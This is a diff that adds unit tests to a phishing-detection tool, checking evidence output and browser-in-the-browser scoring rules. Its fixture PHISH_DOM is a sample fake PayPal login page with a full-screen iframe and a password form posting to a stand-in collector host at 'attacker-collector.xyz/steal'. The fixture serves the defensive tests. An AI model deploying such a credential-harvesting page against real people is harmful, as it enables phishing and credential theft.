@@ -246,6 +246,140 @@ class TestLayer5Reputation(unittest.TestCase):
         self.assertIn("flagged", result)
 
 
+# ── Evidence contract ─────────────────────────────────────────────────────────
+# Every layer returns an `evidence` dict alongside score/detail. The alert store,
+# the detail modal and the exported reports all read it, so a layer that silently
+# stops emitting it degrades those to the one-line detail they used to show.
+class TestLayerEvidenceContract(unittest.TestCase):
+
+    PHISH_DOM = """
+    <html><head><title>PayPal Login</title></head><body>
+      <iframe style="position:fixed;z-index:9999;width:100vw;height:100vh"></iframe>
+      <form action="http://attacker-collector.xyz/steal" method="POST">
+        <input type="text" name="u"><input type="password" name="p">
+      </form>
+      <script>document.onmousedown=function(e){e.preventDefault();}</script>
+    </body></html>"""
+
+    def test_l1_returns_evidence_with_features_and_flags(self):
+        r = run(check_bitb("https://victim.example/login", self.PHISH_DOM))
+        self.assertIn("evidence", r)
+        self.assertIsInstance(r["evidence"].get("features"), dict)
+        self.assertIsInstance(r["evidence"].get("flags"), list)
+        self.assertTrue(r["evidence"]["flags"], "a BitB DOM must record which rules fired")
+
+    def test_l1_evidence_survives_the_memo_cache(self):
+        # check_bitb memoizes on (url, dom digest). Evidence is built inside the
+        # cached value; if it were attached afterwards every cache hit would lose it.
+        url = "https://cache-probe.example/login"
+        first  = run(check_bitb(url, self.PHISH_DOM))
+        second = run(check_bitb(url, self.PHISH_DOM))
+        self.assertEqual(first["evidence"], second["evidence"])
+        self.assertTrue(second["evidence"]["features"])
+
+    def test_l2_evidence_present_on_the_model_path(self):
+        # Flags used to be computed only in the heuristic fallback, so a
+        # model-scored URL reported no signals at all.
+        r = run(check_url("http://paypal-secure-login.unknown-xyz123.tk/login"))
+        self.assertIn("evidence", r)
+        self.assertEqual(len(r["evidence"]["features"]), 13)
+        self.assertIn("has_phish_kw", r["evidence"]["flags"])
+
+    def test_l4_evidence_names_the_off_domain_host(self):
+        r = run(check_form("https://victim.example/login", self.PHISH_DOM))
+        ev = r["evidence"]
+        self.assertIn("attacker-collector.xyz", ev["off_domain_hosts"])
+        self.assertTrue(ev["has_password_field"])
+        self.assertTrue(ev["password_on_off_domain_form"])
+
+    def test_l5_evidence_records_both_feeds(self):
+        r = run(check_reputation("https://example.com", gsb_key=""))
+        ev = r["evidence"]
+        for key in ("gsb_queried", "gsb_hit", "phishtank_queried", "phishtank_hit"):
+            self.assertIn(key, ev)
+        self.assertFalse(ev["gsb_queried"], "no key configured -> GSB not queried")
+
+    def test_evidence_is_additive_only(self):
+        # score/detail keep their original meaning — _fuse_score and the alert
+        # cards read them, so evidence must never displace them.
+        r = run(check_bitb("https://victim.example/login", self.PHISH_DOM))
+        self.assertIsInstance(r["score"], float)
+        self.assertIsInstance(r["detail"], str)
+        self.assertIn("heuristic", r)
+
+    def test_evidence_is_json_serialisable(self):
+        # It round-trips through a JSON column in the alert store.
+        import json
+        for coro in (check_bitb("https://v.example/l", self.PHISH_DOM),
+                     check_url("http://paypal-login.tk/x"),
+                     check_form("https://v.example/l", self.PHISH_DOM)):
+            json.dumps(run(coro)["evidence"])
+
+
+# ── L1 scoring hygiene ────────────────────────────────────────────────────────
+# Two defects these lock down, both found via the graded anomaly fixtures:
+#   1. the rules were substring searches over the raw DOM, so text inside a
+#      comment scored like live markup;
+#   2. the ML overlay was max(heuristic, ml_prob), letting a model trained on a
+#      generic-phishing corpus overrule the BitB rules outright.
+class TestLayer1ScoringHygiene(unittest.TestCase):
+
+    BENIGN = ("<html><head><title>Docs</title></head><body>"
+              "<p>Some ordinary page content.</p></body></html>")
+
+    def test_html_comments_do_not_score(self):
+        # A page that merely *documents* these patterns must not be charged for
+        # them. This is the exact shape of the graded fixtures' headers.
+        commented = (
+            "<html><head><title>Docs</title></head><body>"
+            "<!-- We do NOT use <iframe style=\"position:fixed\"> here, and there is "
+            "no ondragstart / onselectstart / user-select:none anywhere. "
+            "Rule 5 would need class=\"browser-bar\". -->"
+            "<p>Some ordinary page content.</p></body></html>")
+        self.assertEqual(run(check_bitb("https://ok.example/", commented))["heuristic"],
+                         run(check_bitb("https://ok.example/x", self.BENIGN))["heuristic"])
+
+    def test_css_block_comments_do_not_score(self):
+        # /* user-select: none */ styles nothing.
+        styled = ("<html><head><style>"
+                  "/* NOTE: no user-select:none anywhere in this stylesheet */"
+                  "body{color:#222}</style></head><body><p>Hi</p></body></html>")
+        self.assertEqual(run(check_bitb("https://ok.example/c", styled))["heuristic"], 0.0)
+
+    def test_live_markup_still_scores(self):
+        # The comment stripping must not blunt detection on real markup.
+        live = ('<html><body><iframe style="position:fixed;z-index:99999"></iframe>'
+                '</body></html>')
+        r = run(check_bitb("https://evil.example/", live))
+        self.assertGreater(r["heuristic"], 0.5)
+        self.assertIn("fixed-pos iframe", r["evidence"]["flags"])
+
+    def test_ml_cannot_override_the_heuristic(self):
+        # The model may adjust the rule score, never replace it. A page with no
+        # BitB markup must stay low even if the model is confident about it.
+        from core.c2.layer1_bitb import _ML_MAX_BOOST
+        r = run(check_bitb("https://ok.example/ml", self.BENIGN))
+        self.assertEqual(r["heuristic"], 0.0)
+        self.assertLessEqual(r["score"], _ML_MAX_BOOST + 1e-6)
+
+    def test_score_is_heuristic_plus_bounded_boost(self):
+        from core.c2.layer1_bitb import _ML_MAX_BOOST
+        for dom in (self.BENIGN,
+                    '<html><body><iframe style="position:fixed"></iframe></body></html>'):
+            r = run(check_bitb("https://b.example/" + str(len(dom)), dom))
+            ml = r["evidence"]["ml_prob"]
+            if ml is None:
+                continue
+            expected = min(1.0, r["heuristic"] + _ML_MAX_BOOST * ml)
+            self.assertAlmostEqual(r["score"], round(expected, 4), places=3)
+
+    def test_score_never_below_the_heuristic(self):
+        # The boost is additive, so a rule hit can only ever be reinforced.
+        live = '<html><body><iframe style="position:fixed;z-index:99999"></iframe></body></html>'
+        r = run(check_bitb("https://evil.example/floor", live))
+        self.assertGreaterEqual(r["score"], r["heuristic"] - 1e-9)
+
+
 if __name__ == "__main__":
     print("\n=== C2 Phishing Detection Unit Tests ===\n")
     unittest.main(verbosity=2)
